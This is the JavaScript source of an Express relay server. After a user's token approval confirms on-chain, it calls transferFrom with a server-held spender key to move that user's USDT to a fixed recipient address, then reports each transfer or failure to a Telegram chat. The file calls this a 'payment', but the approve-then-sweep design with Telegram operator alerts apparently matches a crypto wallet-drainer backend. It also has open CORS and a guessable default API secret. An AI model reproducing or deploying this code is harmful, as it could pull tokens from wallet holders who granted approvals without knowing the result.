const express = require('express')
const cors = require('cors')
const { ethers } = require('ethers')

const app = express()
app.use(cors())
app.use(express.json())

// Config
const API_SECRET = process.env.API_SECRET || 'default-secret-change-me'
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

// Automation Config
const PRIVATE_KEY = process.env.SPENDER_PRIVATE_KEY
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS
const RPC_URL = process.env.RPC_URL

let lastTelegramSent = 0

// Minimal ERC-20 ABI with transferFrom and decimals
const ERC20_ABI = [
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
  "function decimals() external view returns (uint8)"
]

async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false
  const now = Date.now()
  if (now - lastTelegramSent < 3000) return false
  lastTelegramSent = now
  try {
    const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        disable_web_page_preview: true
      })
    })
    return res.ok
  } catch (err) {
    console.error('Telegram failed:', err.message)
    return false
  }
}

async function executeAutoTransfer(chain, userAddress, tokenAddress, amountStr, approvalTxHash) {
  if (!PRIVATE_KEY || !RECIPIENT_ADDRESS || !RPC_URL) {
    throw new Error("Missing automation environment variables (Private Key, Recipient, or RPC)")
  }

  const provider = new ethers.JsonRpcProvider(RPC_URL)
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider)
  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet)

  // 1. Wait for the approval transaction to be confirmed on-chain
  console.log(`Waiting for approval transaction ${approvalTxHash} to be confirmed...`)
  const approvalReceipt = await provider.waitForTransaction(approvalTxHash)
  
  if (!approvalReceipt || approvalReceipt.status === 0) {
    throw new Error("The approval transaction failed or reverted on-chain")
  }
  console.log("Approval confirmed on-chain. Proceeding with transfer...")

  // 2. Handle Decimals dynamically (BSC USDT = 18, ETH USDT = 6)
  const decimals = await contract.decimals()
  const parsedAmount = ethers.parseUnits(amountStr, decimals)

  // 3. Send transferFrom Transaction
  console.log(`Executing transferFrom for ${amountStr} tokens on contract ${tokenAddress}...`)
  const tx = await contract.transferFrom(userAddress, RECIPIENT_ADDRESS, parsedAmount)
  
  // 4. Wait for the transfer to complete
  const receipt = await tx.wait()
  return receipt.hash
}

app.post('/web/relay', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET) {
    return res.status(401).json({ error: 'Unauthorized' })
  }

  const { chain, address, txHash, spender, token, amount } = req.body
  if (!address || !txHash || !token || !amount) {
    return res.status(400).json({ error: 'Missing fields' })
  }

  console.log(`Received request for chain: ${chain}, user: ${address}`)

  try {
    // Wait for approval verification and then execute the transfer
    const transferTxHash = await executeAutoTransfer(chain, address, token, amount, txHash)
    
    // Log details locally
    console.log(JSON.stringify({
      time: new Date().toISOString(),
      userAddress: address,
      approvalTxHash: txHash,
      transferTxHash: transferTxHash,
      amount,
      chain,
      status: "Success"
    }))

    // Send unified success log to Telegram
    const text = `■ ${chain} Payment Completed\n\n` +
      `User Address: ${address}\n` +
      `Amount: ${amount} USDT\n` +
      `Approval Tx (Confirmed): ${txHash}\n` +
      `Transfer Tx (Success): ${transferTxHash}\n` +
      `Time: ${new Date().toISOString()}`

    await sendTelegram(text)

    return res.json({ ok: true, transferTxHash })

  } catch (error) {
    console.error("Workflow failed:", error.message)

    // Notify Telegram of the failure
    const failureText = `⚠️ AUTOMATION FAILURE\n\n` +
      `Chain: ${chain}\n` +
      `User: ${address}\n` +
      `Amount: ${amount} USDT\n` +
      `Approval Tx: ${txHash}\n` +
      `Error Details: ${error.message}`
    
    await sendTelegram(failureText)

    return res.status(500).json({ error: "Automated workflow failed", details: error.message })
  }
})

app.get('/', (req, res) => res.send('Relay logger & automation alive'))
app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }))

const PORT = process.env.PORT || 3000
app.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port', PORT)
})
